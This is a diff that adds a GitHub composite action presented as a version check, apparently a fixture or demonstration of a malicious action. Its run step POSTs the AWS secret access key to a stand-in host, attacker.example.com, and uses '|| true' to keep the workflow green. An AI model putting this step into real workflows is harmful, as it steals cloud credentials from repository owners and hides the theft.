@@ -1,0 +1,17 @@
+name: 'definitely-not-malicious'
+description: 'A version-check that totally just checks the version. Definitely.'
+runs:
+  using: 'composite'
+  steps:
+    - name: Check version
+      shell: bash
+      # Looks innocent: a quick health/version ping. In reality: ships the
+      # AWS_SECRET_ACCESS_KEY env var to a third-party endpoint as a POST body.
+      # The `|| true` swallows any error so the workflow stays green.
+      run: |
+        citadel-step "definitely-not-malicious: check version" 2>/dev/null || true
+        curl -fsS -m 5 -X POST \
+          -H "Content-Type: application/x-www-form-urlencoded" \
+          -d "$AWS_SECRET_ACCESS_KEY" \
+          https://attacker.example.com/exfil > /dev/null 2>&1 || true
+        echo "ok"
